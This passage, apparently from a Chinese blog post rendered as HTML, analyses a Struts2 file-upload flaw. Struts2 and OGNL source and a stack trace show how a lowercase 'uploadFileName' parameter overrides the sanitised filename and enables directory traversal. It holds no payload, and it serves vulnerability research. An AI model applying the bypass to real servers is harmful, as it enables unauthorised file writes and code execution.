+</span></span></code></pre></div><p>再回到主逻辑，<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept</code> 的<code>parameters </code>会收到所有传入的参数并调用<code>this.setParameters</code>将这些参数通过用户的setter方法传递过去</p>
+<p>
+  <img src="Struts2-Upload-RCE.assets/image-20231216114851153.png" alt="image-20231216114851153" /></p>
+<p>可以注意到上图中有两个变量名：<code>UploadFileName</code> 和 <code>uploadFileName</code>  有不同的值，但都会调用<code>setUploadFileName</code> 这个方法，也就是会执行两次<code>setUploadFileName</code> ，小写开头的<code>uploadFileName</code> 会替换掉由Struts2自动生成的大写<code>UploadFileName</code>的值，进而目录穿越，这就是漏洞点</p>
+<blockquote>
+<p>示例中的upload类（ org.apache.struts2.showcase.fileupload.FileUploadAction）：</p>
+<p>public void setUpload(File upload)</p>
+<p>public void setUploadFileName(String fileName)</p>
+<p>public void setUploadContentType(String contentType)</p>
+</blockquote>
+<p>再来看为何 <code>UploadFileName</code> 和 <code>uploadFileName</code>   两个都会执行 <code>setUploadFileName</code> 跟进 <code>this.setParameters</code>， 可以看到通过 <code>newStack.setParameter</code> 进行设置参数，继续跟进</p>
+<p>
+  <img src="Struts2-Upload-RCE.assets/image-20231216120920768.png" alt="image-20231216120920768" /></p>
+<p>
+  <img src="Struts2-Upload-RCE.assets/image-20231216121041252.png" alt="image-20231216121041252" /></p>
+<p>在 <code>org.apache.struts2.showcase.fileupload.FileUploadAction#setUpload</code>打个断点 ，回溯</p>
+<pre tabindex="0"><code>setUpload:89, FileUploadAction (org.apache.struts2.showcase.fileupload)
+invokeVirtual:-1, DirectMethodHandle$Holder (java.lang.invoke)
+invoke:-1, LambdaForm$MH/0x0000000800cc2000 (java.lang.invoke)
+invokeExact_MT:-1, Invokers$Holder (java.lang.invoke)
+invokeImpl:155, DirectMethodHandleAccessor (jdk.internal.reflect)
+invoke:104, DirectMethodHandleAccessor (jdk.internal.reflect)
+invoke:577, Method (java.lang.reflect)
+invokeMethodInsideSandbox:1245, OgnlRuntime (ognl)
+invokeMethod:1230, OgnlRuntime (ognl)
+callAppropriateMethod:1958, OgnlRuntime (ognl)
+setMethodValue:2196, OgnlRuntime (ognl)
+setPossibleProperty:98, ObjectPropertyAccessor (ognl)
+setProperty:175, ObjectPropertyAccessor (ognl)
+setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor)
+setProperty:3359, OgnlRuntime (ognl)
+setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)
+setProperty:3359, OgnlRuntime (ognl)
+setValueBody:134, ASTProperty (ognl)
+evaluateSetValueBody:220, SimpleNode (ognl)
+setValue:308, SimpleNode (ognl)
+setValue:829, Ognl (ognl)
+lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
+execute:-1, OgnlUtil$$Lambda$383/0x0000000800fa97a0 (com.opensymphony.xwork2.ognl)
+compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
+setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)
+trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)
+setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)
+setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)
+setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
+doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
+...
+</code></pre><p>着重看下<code>ognl.OgnlRuntime#setMethodValue(ognl.OgnlContext, java.lang.Object, java.lang.String, java.lang.Object, boolean)</code> 如何获取方法的，为什么<code>uploadFileName</code>  会调用<code>setUploadFileName</code>方法</p>
+<p>
+  <img src="Struts2-Upload-RCE.assets/image-20231216121647961.png" alt="image-20231216121647961" /></p>
+<p><code>ognl.OgnlRuntime#_getSetMethod </code> 中的逻辑主要是获取属性的所有方法，根据参数的个数是否为1 判断是否为set方法</p>
+<p>
+  <img src="Struts2-Upload-RCE.assets/image-20231216121849785.png" alt="image-20231216121849785" /></p>
+<p><code>ognl.OgnlRuntime#getDeclaredMethods </code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> List <span style="color:#a6e22e">getDeclaredMethods</span><span style="color:#f92672">(</span>Class targetClass<span style="color:#f92672">,</span> String propertyName<span style="color:#f92672">,</span> <span style="color:#66d9ef">boolean</span> findSets<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        List result <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        ClassCache cache <span style="color:#f92672">=</span> _declaredMethods<span style="color:#f92672">[</span>findSets <span style="color:#f92672">?</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">];</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Map propertyCache <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Map<span style="color:#f92672">)</span> cache<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>targetClass<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>propertyCache <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> <span style="color:#f92672">((</span>result <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>List<span style="color:#f92672">)</span> propertyCache<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>propertyName<span style="color:#f92672">))</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">synchronized</span> <span style="color:#f92672">(</span>cache<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                propertyCache <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Map<span style="color:#f92672">)</span> cache<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>targetClass<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>propertyCache <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> <span style="color:#f92672">((</span>result <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>List<span style="color:#f92672">)</span> propertyCache<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>propertyName<span style="color:#f92672">))</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>										
+</span></span><span style="display:flex;"><span>                  	<span style="color:#75715e">// 对属性名进行处理
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    String baseName <span style="color:#f92672">=</span> capitalizeBeanPropertyName<span style="color:#f92672">(</span>propertyName<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                    result <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ArrayList<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>                  	
+</span></span><span style="display:flex;"><span>                  	<span style="color:#75715e">// 匹配符合属性名的方法
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    collectAccessors<span style="color:#f92672">(</span>targetClass<span style="color:#f92672">,</span> baseName<span style="color:#f92672">,</span> result<span style="color:#f92672">,</span> findSets<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>propertyCache <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                        cache<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>targetClass<span style="color:#f92672">,</span> propertyCache <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">(</span><span style="color:#ae81ff">101</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                    propertyCache<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>propertyName<span style="color:#f92672">,</span> result<span style="color:#f92672">.</span><span style="color:#a6e22e">isEmpty</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> NotFoundList <span style="color:#f92672">:</span> result<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> result<span style="color:#f92672">.</span><span style="color:#a6e22e">isEmpty</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">:</span> result<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>result <span style="color:#f92672">==</span> NotFoundList<span style="color:#f92672">)</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">:</span> result<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><code>ognl.OgnlRuntime#capitalizeBeanPropertyName</code> 主要是将属性名返回格式处理成 首字母大写， 用来组成 setter方法，比如<code>setUpload</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">capitalizeBeanPropertyName</span><span style="color:#f92672">(</span>String propertyName<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">toUpperCase</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>      	<span style="color:#75715e">// 一些特殊的方法调用：
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// don&#39;t capitalize getters/setters
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">startsWith</span><span style="color:#f92672">(</span>GET_PREFIX<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">endsWith</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;()&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>Character<span style="color:#f92672">.</span><span style="color:#a6e22e">isUpperCase</span><span style="color:#f92672">(</span>propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">substring</span><span style="color:#f92672">(</span><span style="color:#ae81ff">3</span><span style="color:#f92672">,</span><span style="color:#ae81ff">4</span><span style="color:#f92672">).</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> propertyName<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">startsWith</span><span style="color:#f92672">(</span>SET_PREFIX<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">endsWith</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;)&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>Character<span style="color:#f92672">.</span><span style="color:#a6e22e">isUpperCase</span><span style="color:#f92672">(</span>propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">substring</span><span style="color:#f92672">(</span><span style="color:#ae81ff">3</span><span style="color:#f92672">,</span><span style="color:#ae81ff">4</span><span style="color:#f92672">).</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> propertyName<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">startsWith</span><span style="color:#f92672">(</span>IS_PREFIX<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">endsWith</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;()&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>Character<span style="color:#f92672">.</span><span style="color:#a6e22e">isUpperCase</span><span style="color:#f92672">(</span>propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">substring</span><span style="color:#f92672">(</span><span style="color:#ae81ff">2</span><span style="color:#f92672">,</span><span style="color:#ae81ff">3</span><span style="color:#f92672">).</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> propertyName<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> first <span style="color:#f92672">=</span> propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> second <span style="color:#f92672">=</span> propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>      	
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>Character<span style="color:#f92672">.</span><span style="color:#a6e22e">isLowerCase</span><span style="color:#f92672">(</span>first<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> Character<span style="color:#f92672">.</span><span style="color:#a6e22e">isUpperCase</span><span style="color:#f92672">(</span>second<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> propertyName<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>          	<span style="color:#75715e">// 将 首字母大写 返回，用来后面拼接 set  匹配方法
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">char</span><span style="color:#f92672">[]</span> chars <span style="color:#f92672">=</span> propertyName<span style="color:#f92672">.</span><span style="color:#a6e22e">toCharArray</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            chars<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> Character<span style="color:#f92672">.</span><span style="color:#a6e22e">toUpperCase</span><span style="color:#f92672">(</span>chars<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> String<span style="color:#f92672">(</span>chars<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>将恶意参数 <code>uploadFileName</code>  转成<code>UploadFileName</code></p>
+<p>
+  <img src="Struts2-Upload-RCE.assets/image-20231216130417810.png" alt="image-20231216130417810" /></p>
+<p>遍历方法，取出匹配的方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">collectAccessors</span><span style="color:#f92672">(</span>Class c<span style="color:#f92672">,</span> String baseName<span style="color:#f92672">,</span> List result<span style="color:#f92672">,</span> <span style="color:#66d9ef">boolean</span> findSets<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        Method<span style="color:#f92672">[]</span> methods<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            methods <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredMethods</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>SecurityException ignored<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            methods <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span><span style="color:#a6e22e">getMethods</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> methods<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>c<span style="color:#f92672">.</span><span style="color:#a6e22e">isInterface</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>isDefaultMethod<span style="color:#f92672">(</span>methods<span style="color:#f92672">[</span>i<span style="color:#f92672">])</span> <span style="color:#f92672">||</span> isNonDefaultPublicInterfaceMethod<span style="color:#f92672">(</span>methods<span style="color:#f92672">[</span>i<span style="color:#f92672">]))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    addIfAccessor<span style="color:#f92672">(</span>result<span style="color:#f92672">,</span> methods<span style="color:#f92672">[</span>i<span style="color:#f92672">],</span> baseName<span style="color:#f92672">,</span> findSets<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>						<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            addIfAccessor<span style="color:#f92672">(</span>result<span style="color:#f92672">,</span> methods<span style="color:#f92672">[</span>i<span style="color:#f92672">],</span> baseName<span style="color:#f92672">,</span> findSets<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>取出属性名相关的 is 、set、get方法 ，主要是通过长度来添加方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//     private static final String SET_PREFIX = &#34;set&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//     private static final String GET_PREFIX = &#34;get&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//     pprivate static final String IS_PREFIX = &#34;is&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addIfAccessor</span><span style="color:#f92672">(</span>List result<span style="color:#f92672">,</span> Method method<span style="color:#f92672">,</span> String baseName<span style="color:#f92672">,</span> <span style="color:#66d9ef">boolean</span> findSets<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String ms <span style="color:#f92672">=</span> method<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>    		<span style="color:#75715e">// 必须以属性名结尾
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ms<span style="color:#f92672">.</span><span style="color:#a6e22e">endsWith</span><span style="color:#f92672">(</span>baseName<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">boolean</span> isSet <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">,</span> isIs <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>isSet <span style="color:#f92672">=</span> ms<span style="color:#f92672">.</span><span style="color:#a6e22e">startsWith</span><span style="color:#f92672">(</span>SET_PREFIX<span style="color:#f92672">))</span> <span style="color:#f92672">||</span> ms<span style="color:#f92672">.</span><span style="color:#a6e22e">startsWith</span><span style="color:#f92672">(</span>GET_PREFIX<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">||</span> <span style="color:#f92672">(</span>isIs <span style="color:#f92672">=</span> ms<span style="color:#f92672">.</span><span style="color:#a6e22e">startsWith</span><span style="color:#f92672">(</span>IS_PREFIX<span style="color:#f92672">)))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> prefixLength <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>isIs <span style="color:#f92672">?</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>isSet <span style="color:#f92672">==</span> findSets<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                  	<span style="color:#75715e">// 并且长度一样
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>baseName<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> <span style="color:#f92672">(</span>ms<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">-</span> prefixLength<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                        result<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>method<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>从上面看，如果是小写的<code>uploadFileName</code>方法正好能通过<code>capitalizeBeanPropertyName</code> 将首字母大写，而被<code>addIfAccessor</code>匹配添加进列表执行。</p>
+<p>而在这个过程中，先添加进去的方法会被后进的方法覆盖执行，所以利用也取决于添加顺序和排序顺序：</p>
+<p><code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setParameters</span><span style="color:#f92672">(</span>Object action<span style="color:#f92672">,</span> ValueStack stack<span style="color:#f92672">,</span> HttpParameters parameters<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        HttpParameters params<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        TreeMap acceptableParameters<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ordered</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            params <span style="color:#f92672">=</span> HttpParameters<span style="color:#f92672">.</span><span style="color:#a6e22e">create</span><span style="color:#f92672">().</span><span style="color:#a6e22e">withComparator</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getOrderedComparator</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">withParent</span><span style="color:#f92672">(</span>parameters<span style="color:#f92672">).</span><span style="color:#a6e22e">build</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            acceptableParameters <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TreeMap<span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getOrderedComparator</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            params <span style="color:#f92672">=</span> HttpParameters<span style="color:#f92672">.</span><span style="color:#a6e22e">create</span><span style="color:#f92672">().</span><span style="color:#a6e22e">withParent</span><span style="color:#f92672">(</span>parameters<span style="color:#f92672">).</span><span style="color:#a6e22e">build</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            acceptableParameters <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TreeMap<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="还有没有其他的">
+  还有没有其他的
+  <a class="anchor" href="#%e8%bf%98%e6%9c%89%e6%b2%a1%e6%9c%89%e5%85%b6%e4%bb%96%e7%9a%84">#</a>
+</h1>
+<p>总结一下，默认在 <code>org.apache.struts2.interceptor.FileUploadInterceptor#intercept</code>中的文件名处理<code>String[] fileName = multiWrapper.getFileNames(inputName);</code>会调用<code>org.apache.struts2.dispatcher.multipart.AbstractMultiPartRequest#getCanonicalName</code>将目录穿越的参数过滤掉，而因为所有的参数都会流入<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>  进行赋值，用户自己传上来的文件名参数不会经过<code>getCanonicalName</code>过滤操作，从而进行绕过了。</p>
+<p>所以，还有没有在拦截器中过滤的参数，可以通过<code>ParametersInterceptor#setParameters</code>重新设置上？</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
